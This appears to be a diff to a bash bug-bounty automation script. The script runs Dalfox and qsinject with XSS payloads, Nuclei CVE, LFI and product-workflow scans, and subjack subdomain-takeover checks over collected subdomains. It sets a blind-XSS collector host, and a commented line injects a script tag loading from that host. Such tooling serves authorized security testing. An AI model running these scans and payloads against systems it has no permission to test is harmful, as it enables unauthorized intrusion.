@@ -31,6 +31,22 @@ xfilechecker(){
     return 1
 }
 
+function counter(){
+    sdc=$project/subdomains/subdomains.txt
+    sdpc=$project/subdomains/sd-potentials.txt
+    apache=$project/subdomains/apache-sites.txt
+    wp=$project/subdomains/wordpress-sites.txt
+    jira=$project/subdomains/jira-sites.txt
+    gitl=$project/subdomains/gitlab-sites.txt
+
+    [ -f $sdc ] && echo -e "[*] Total Subdomains [$(cat $sdc | wc -l)]"
+    [ -f $sdpc ] && echo -e "[*] Potential Subdomains [$(cat $sdpc | wc -l)]"
+    [ -f $apache ] && echo -e "[*] Apache Subdomains [$(cat $apache | wc -l)]"
+    [ -f $wp ] && echo -e "[*] WordPress Subdomains [$(cat $wp | wc -l)]"
+    [ -f $jira ] && echo -e "[*] Jira Subdomains [$(cat $jira | wc -l)]"
+    [ -f $gitl ] && echo -e "[*] GitLab Subdomains [$(cat $gitl | wc -l)]" 
+}
+
 
 function xssdalfoxss(){
     xsshturl=https://pipiwa.xss.ht
@@ -42,7 +58,7 @@ function xssdalfoxss(){
     [ -s $tmpdir/allxssf ] && echo "${BLUE}Running Dalfox${RESET}" || xfilechecker
     
     #dalfox file "$domain"_xss.txt -b $blind -o $out -H "referrer: xxx'><script src=//$blind></script>"
-
+    echo -e "[*] Running Dalfox XSS Scan"
     while IFS= read line
         do 
             cat $line | sed 's/=.*/=/' | sed 's/URL: //' | tee $tmpdir/testxss
@@ -57,6 +73,7 @@ function xssqsinjector(){
     find $project -type f -name xss.txt > $tmpdir/allxssf
     [ -s $tmpdir/allxssf ] && echo "${BLUE}Running with payload manually${RESET}" || xfilechecker
     
+    echo -e "[*] Running QSinjector XSS Scan"
     while IFS= read line
         do 
             cat $line | qsinject -i '"><script>confirm(1)</script>' -iu -decode >> $tmpdir/qsinjectall
@@ -68,13 +85,13 @@ function xssqsinjector(){
         done <"$tmpdir/qsinjectall"
 }
 
-
 function lfinuclei(){
     [ -d $tmpdir ] && echo "$tmpdir Directory Exists" || mkdir -p $tmpdir
     [ -d $results ] && echo "$results Directory Exists" || mkdir -p $results
 
     find $project -type f -name lfi.txt > $tmpdir/all-lfi
     [ -s $tmpdir/all-lfi ] && echo "${BLUE}Running Nuclei LFI Template from Config${RESET}" || xfilechecker
+    echo -e "[*] Running LFI-Nuclei Scan"
     while IFS= read lfif
         do 
             echo "${MAGENTA}Running on $lfif  ${RESET}"
@@ -87,29 +104,39 @@ function lfinuclei(){
 function cvenuclei(){
     [ -d $tmpdir ] && echo "$tmpdir Directory Exists" || mkdir -p $tmpdir
     [ -d $results ] && echo "$results Directory Exists" || mkdir -p $results
-   
+    echo -e "[*] Running CVE-Nuclei Scan"
     nuclei -l $project/subdomains/sd-potentials.txt -t /root/nuclei-templates/cves/ -timeout 7 -silent -o $results/cve.txt
 }
 
-nucleiworkflowscan(){
+function nucleiworkflowscan(){
     [ -d $tmpdir ] && echo "$tmpdir Directory Exists" || mkdir -p $tmpdir
     [ -d $results ] && echo "$results Directory Exists" || mkdir -p $results
 
+    
     jira=$project/subdomains/jira-sites.txt
+    [ -f $jira ] && echo -e "[*] Running Nuclei Workflow Jira Scan"
     [ -f $jira ] && nuclei -l $jira -w /root/nuclei-templates/workflows/jira-workflow.yaml -o $results/jira.txt
-
+    
     wordpress=$project/subdomains/wordpress-sites.txt
+    [ -f $wordpress ] && echo -e "[*] Running Nuclei Workflow WordPress Scan"
     [ -f $wordpress ] && nuclei -l $wordpress -w /root/nuclei-templates/workflows/wordpress-workflow.yaml -o $results/wordpress.txt
 
     apache=$project/subdomains/apache-sites.txt
+    [ -f $apache ] && echo -e "[*] Running Nuclei Workflow Apache Scan"
     [ -f $apache ] && nuclei -l $apache -w /root/nuclei-templates/workflows/apache-workflow.yaml -o $results/apache.txt
-
+    
     gitlab=$project/subdomains/gitlab-sites.txt
+    [ -f $gitlab ] && echo -e "[*] Running Nuclei Workflow GitLab Scan"
     [ -f $gitlab ] && nuclei -l $gitlab -w /root/nuclei-templates/workflows/gitlab-workflow.yaml -o $results/gitlab.txt
 }
 
-subdomaintko(){
-    subjack -w $project/subdomains/subdomains.txt -t 100 -timeout 30 -c config/config.json
+function subdomaintko(){
+    [ -d $tmpdir ] && echo "$tmpdir Directory Exists" || mkdir -p $tmpdir
+    [ -d $results ] && echo "$results Directory Exists" || mkdir -p $results
+    echo -e "[*] Checking for Subdomain Takeover Scan"
+    subjack -w $project/subdomains/subdomains.txt -t 100 -timeout 30 -c config/config.json > $results/subjacktko.txt && cat $results/subjacktko.txt
+    #cat $project/subdomains/all-httpx.txt | cut -d " " -f 1 > $tmpdir/all-sub
+    #subzy -targets $tmpdir/all-sub > $results/subzytko.txt
 }
 
 #Menu options
@@ -198,6 +225,6 @@ projectdirectorycheck(){
     results="$project/results"
 }
 
-
 projectdirectorycheck
+counter
 ACTIONS
